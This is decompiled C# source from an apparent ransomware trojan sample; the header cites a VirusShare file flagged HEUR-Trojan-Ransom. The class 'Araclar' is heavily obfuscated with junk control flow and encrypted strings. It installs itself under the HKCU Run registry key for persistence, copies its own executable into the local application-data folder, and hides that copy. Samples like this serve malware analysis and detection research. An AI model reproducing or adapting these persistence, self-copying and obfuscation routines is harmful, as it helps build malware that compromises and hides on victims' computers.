// Decompiled with JetBrains decompiler
// Type: browser_bastan.Araclar
// Assembly: Windows32, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C0E8C928-D720-4A30-9B2C-321D375113F4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Generic-92172fbb989020cfc49bc53b76e2e89757f091eed1f5ea61ebd7be53bac4deeb.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace browser_bastan
{
  public class Araclar
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static string Regkeyname;
    public static string DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Araclar.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(string src, string dst)
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            Araclar.rhE8lpo6WwXCRXc9WsI((object) dst, FileAttributes.Normal);
            break;
          case 3:
            if (Araclar.WxyXc0oE1wArwYEOUgX((object) dst))
            {
              Araclar.dYF8oFoiOWOrlBf7xwU();
              num = Araclar.z7s57NolGLs6ndGHimw() ? 4 : 0;
              continue;
            }
            break;
          case 5:
            goto label_6;
        }
        try
        {
          Araclar.KqBCyfoUQt8y99wXBXi((object) src, (object) dst, true);
        }
        catch (Exception ex)
        {
        }
        Araclar.rhE8lpo6WwXCRXc9WsI((object) dst, FileAttributes.Hidden);
        num = 5;
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(string name, string path)
    {
      int num = 5;
      while (true)
      {
        RegistryKey registryKey;
        switch (num)
        {
          case 0:
            goto label_12;
          case 2:
            goto label_13;
          case 4:
            if (registryKey == null)
            {
              if (Araclar.dYF8oFoiOWOrlBf7xwU())
              {
                if (true)
                {
                  num = 0;
                  continue;
                }
                break;
              }
              num = 1;
              continue;
            }
            Araclar.DBlWPooBNphBVf5ChPp((object) registryKey, (object) name, (object) path);
            break;
          case 5:
            registryKey = (RegistryKey) Araclar.qSjbTToVH9YACMgp5kL((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1846), true);
            num = 4;
            continue;
          case 6:
            goto label_6;
        }
        Araclar.B73wRsoDKcd0INIrb4L((object) registryKey);
        if (Araclar.dYF8oFoiOWOrlBf7xwU())
          num = 6;
        else
          break;
      }
      return;
label_12:
      return;
label_13:
      return;
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      int num = 5;
      string str1;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            if (!Araclar.GjhefSo8rCpNqCwHxQP(Araclar.TYGZVxoNmAqSKuVRdGL((object) str2), (object) str1))
            {
              Araclar.KBlRkRoAW8qB0hdccf7((object) str2, Araclar.NN47Scoqj3Gdio9mUmC((object) str1, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1940), (object) Araclar.DstName));
              num = 6;
              continue;
            }
            goto label_13;
          case 1:
          case 3:
            str1 = (string) Araclar.BA3bRLoJ6uDpEth8GOV(Environment.SpecialFolder.LocalApplicationData);
            goto case 0;
          case 4:
            goto label_4;
          case 5:
            str2 = (string) Araclar.wmTwTJojQdRV3IaIpok(Araclar.tnF969othgiGkwMohaJ());
            if (!Araclar.dYF8oFoiOWOrlBf7xwU())
            {
              num = 0;
              continue;
            }
            if (Araclar.dYF8oFoiOWOrlBf7xwU())
            {
              num = 3;
              continue;
            }
            goto label_12;
          case 6:
            goto label_8;
          default:
            if (Araclar.dYF8oFoiOWOrlBf7xwU())
            {
              num = 4;
              continue;
            }
            goto label_7;
        }
      }
label_13:
      return;
label_4:
      return;
label_8:
      return;
label_7:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Araclar()
    {
      Araclar.ikJZsooz0Z7lrR46WEJ();
      Araclar.l52Utk3niB8nqPBQvNO((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Araclar()
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            Araclar.Regkeyname = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1946);
            break;
          case 3:
            Araclar.ikJZsooz0Z7lrR46WEJ();
            Araclar.dYF8oFoiOWOrlBf7xwU();
            num = Araclar.z7s57NolGLs6ndGHimw() ? 4 : 0;
            continue;
          case 5:
            goto label_4;
        }
        Araclar.DstName = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1968);
        num = 5;
      }
label_4:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool dYF8oFoiOWOrlBf7xwU() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool z7s57NolGLs6ndGHimw() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool WxyXc0oE1wArwYEOUgX([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void rhE8lpo6WwXCRXc9WsI([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void KqBCyfoUQt8y99wXBXi([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object qSjbTToVH9YACMgp5kL([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void DBlWPooBNphBVf5ChPp([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void B73wRsoDKcd0INIrb4L([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object tnF969othgiGkwMohaJ() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object wmTwTJojQdRV3IaIpok([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object BA3bRLoJ6uDpEth8GOV([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object TYGZVxoNmAqSKuVRdGL([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool GjhefSo8rCpNqCwHxQP([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object NN47Scoqj3Gdio9mUmC([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void KBlRkRoAW8qB0hdccf7([In] object obj0, [In] object obj1) => Araclar.Copy((string) obj0, (string) obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void ikJZsooz0Z7lrR46WEJ() => eWK97ZHZd8El3E8K9m.NHu2uVAz3YZST();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void l52Utk3niB8nqPBQvNO([In] object obj0) => obj0.\u002Ector();
  }
}
